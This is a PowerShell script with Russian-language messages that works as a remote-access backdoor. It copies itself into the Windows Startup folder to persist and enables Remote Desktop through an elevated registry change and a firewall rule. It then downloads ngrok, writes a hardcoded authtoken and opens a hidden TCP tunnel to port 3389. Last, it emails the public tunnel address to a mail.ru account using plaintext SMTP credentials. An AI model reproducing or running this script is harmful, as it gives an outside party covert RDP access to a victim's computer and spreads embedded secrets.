$thisScript         = $MyInvocation.MyCommand.Path
$startupScriptPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"

if ($thisScript -ne $startupScriptPath -and !(Test-Path $startupScriptPath)) {
    Copy-Item -Path $thisScript -Destination $startupScriptPath -Force
    exit
}

Start-Process reg -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb runAs | Out-Null
netsh advfirewall firewall set rule group="Удаленный рабочий стол" new enable=Yes

$ngrokDir   = "$env:APPDATA\ngrok"
$ngrokExe   = Join-Path $ngrokDir "ngrok.exe"
$tempZip    = "$env:TEMP\ngrok.zip"

if (!(Test-Path $ngrokExe)) {
    Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile $tempZip
    Expand-Archive -Path $tempZip -DestinationPath $ngrokDir -Force
}

$ngrokConfigDir = "$env:USERPROFILE\.ngrok2"
$ngrokConfig    = Join-Path $ngrokConfigDir "ngrok.yml"
if (!(Test-Path $ngrokConfig)) {
    if (!(Test-Path $ngrokConfigDir)) { New-Item -ItemType Directory -Path $ngrokConfigDir | Out-Null }
    @"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
"@ | Out-File -Encoding ASCII $ngrokConfig
}

Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden

$tunnelAddress = $null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $resp = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
        $tcpTunnel = $resp.tunnels | Where-Object { $_.proto -eq "tcp" }
        if ($tcpTunnel?.public_url) {
            $tunnelAddress = $tcpTunnel.public_url
            break
        }
    } catch {
        Start-Sleep -Seconds 1
    }
}

if ($tunnelAddress) {
    $smtpServer = "smtp.mail.ru"
    $smtpPort   = 465
    $smtpUser   = "user.default00@mail.ru"
    $smtpPass   = "smhdebashit"

    $fromEmail = $smtpUser
    $toEmail   = "user.default00@mail.ru"
    $subject   = "Ngrok RDP адрес"
    $body      = "Ngrok публичный TCP адрес:`n`t$tunnelAddress"

    try {
        $cred = New-Object System.Management.Automation.PSCredential(
            $smtpUser,
            (ConvertTo-SecureString $smtpPass -AsPlainText -Force)
        )
        Send-MailMessage `
          -From $fromEmail `
          -To $toEmail `
          -Subject $subject `
          -Body $body `
          -SmtpServer $smtpServer `
          -Port $smtpPort `
          -UseSsl `
          -Credential $cred `
          -ErrorAction Stop
    } catch {
        "[$(Get-Date)] Ошибка при отправке email: $_" |
          Out-File "$env:TEMP\ngrok_error.log" -Append
    }
} else {
    "[$(Get-Date)] Не удалось получить публичный адрес от ngrok." |
      Out-File "$env:TEMP\ngrok_error.log" -Append
}
